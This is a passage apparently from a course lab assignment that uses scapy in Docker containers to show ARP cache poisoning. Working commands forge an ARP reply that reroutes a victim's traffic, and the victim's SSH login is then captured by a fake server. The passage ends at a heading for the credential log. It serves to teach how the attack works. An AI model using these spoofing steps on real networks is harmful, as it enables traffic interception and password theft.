    `>>> server_ip = "172.20.0.5"` `>>> victim_ip = "172.20.0.6"`


    ① IPv4 addresses are strings in scapy


    Now let’s see how scapy allows us to build packets. We’ll make an Ethernet frame,
    with an IP packet inside it, with an ICMP echo request in that, with the data
    being set to our name:


    ## Listing 6. attacker


    ```

    >>> ping = Ether()/IP(dst=server_ip)/ICMP()/"Ryan Tolboom" ① >>> ping.show() ②
    ###[ Ethernet ]### dst = 02:42:ac:14:00:05 src = 02:42:ac:14:00:07 type = IPv4
    ###[ IP ]### version = 4 ihl = None tos = 0x0 len = None id = 1 flags = frag =
    0 ttl = 64 proto = icmp chksum = None src = 172.20.0.7 dst = 172.20.0.5 \options
    \ ###[ ICMP ]### type = echo-request code = 0 chksum = None id = 0x0 seq = 0x0
    unused = '''' ###[ Raw ]### load = ''Ryan Tolboom'' >>> result = srp1(ping) ③
    Begin emission: Finished sending 1 packets. .* Received 2 packets, got 1 answers,
    remaining 0 packets >>> result.show() ###[ Ethernet ]### dst = 02:42:ac:14:00:07
    src = 02:42:ac:14:00:05 type = IPv4 ###[ IP ]### version = 4 ihl = 5 tos = 0x0
    len = 40 id = 62086 flags = frag = 0 ttl = 64 proto = icmp chksum = 0x301a src
    = 172.20.0.5 dst = 172.20.0.7 \options \ ###[ ICMP ]### type = echo-reply code
    = 0 chksum = 0xea7a id = 0x0 seq = 0x0 unused = '''' ###[ Raw ]### load = ''Ryan
    Tolboom'' >>> server_mac = result[0][0].src >>> server_mac ''02:42:ac:14:00:05''

    ```


    ① Scapy uses the `/` operator to nest protocols. This is my name in an ICMP packet,
    in an IP packet, in an Ethernet frame. Be sure you use your own name!

    ② The `show()` command prints out packets in detail

    ③ The `srp1()` function sends and receives *one* packet at Layer 2


    Notice how we use this to capture the server’s MAC address and save it in the
    `server_mac` variable.


    We can also determine MAC addresses at Layer 2 with an ARP "who-has" request.
    Let’s craft and send a broadcast ethernet frame with an ARP "who-has" request
    for the victims’s IP address. The result will tell use what the victim’s MAC address
    is:


    ## Listing 7. attacker


    ```

    >>> whohas = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=victim_ip) >>> result = srp1(whohas)
    Begin emission: Finished sending 1 packets. * Received 1 packets, got 1 answers,
    remaining 0 packets >>> result.show() ###[ Ethernet ]### dst = 02:42:ac:14:00:07
    src = 02:42:ac:14:00:06 ① type = ARP ###[ ARP ]### hwtype = 0x1 ptype = IPv4 hwlen
    = 6 plen = 4 op = is-at hwsrc = 02:42:ac:14:00:06 psrc = 172.20.0.6 hwdst = 02:42:ac:14:00:07
    pdst = 172.20.0.7 >>> victim_mac = result[0].src

    ```


    ① This is my MAC address of victim, but yours may be different!


    This is how an ARP exchange is supposed to work. We broadcast out asking what
    MAC we should use for a certain IP and we get a response *from the person who
    legitimately has that MAC and IP*.


    We have everything we need to create an ARP packet telling the victim to send
    traffic to us when they are trying to access servers IP:


    ## Listing 8. attacker


    ```

    >>> victim_ip, victim_mac, server_ip, server_mac (''172.20.0.6'', ''02:42:ac:14:00:06'',
    ''172.20.0.5'', ''02:42:ac:14:00:05'')

    ```


    Now let’s make and view an evil ARP packet:


    ## Listing 9. attacker


    ```

    >>> bad_arp = ARP(op=2, pdst=victim_ip, psrc=server_ip, hwdst=victim_mac) >>>
    bad_arp <ARP op=is-at psrc=172.20.0.5 hwdst=02:42:ac:14:00:06 pdst=172.20.0.6
    |>

    ```


    This packet posits itself as coming from the server, it is aimed at the victim
    in both IP and MAC, but the MAC address that will be used to send it is ours (by
    default, we don’t specify with `hwsrc`). This means the victim will update their
    ARP cache such that frames destined for server go to attacker. This effectively
    reroutes all layer 2 traffic that was going to the server from the victim.


    Go ahead an send that ARP packet:


    ## Listing 10. attacker


    ```

    >>> send(bad_arp) . Sent 1 packets.

    ```


    Now go back to the victim terminal with the SSH connection to server and try typing
    something. As soon as SSH has to send data, you will get a broken pipe error and
    the connection will drop. Faced with such a problem, what do you think most users
    will do? Probably try to reconnect, let’s try that too. Remember the password
    is "password".


    ## Listing 11. victim


    ```

    You are now logged into ''server'' (presumably from ''victim'') via SSH for this
    assignment. Leave this connection open while you experiment with scapy from ''attacker''.
    bf9ebe42a108:~# client_loop: send disconnect: Broken pipe ① bash-5.0# ssh server
    Warning: Permanently added ''server,172.20.0.5'' (ECDSA) to the list of known
    hosts. root@server''s password: #

    ```


    ① This happened when they tried to type something right after we sent the malicious
    ARP


    Wait, that prompt looks a little different and where’s the message about staying
    logged in? It turns out the victim actually signed into our fake SSH server and
    their username and password were logged! Take a look at the output from the terminal
    running `docker-compose up`, you’ll see the credentials entered:


    ## Listing 12. docker-compose up terminal

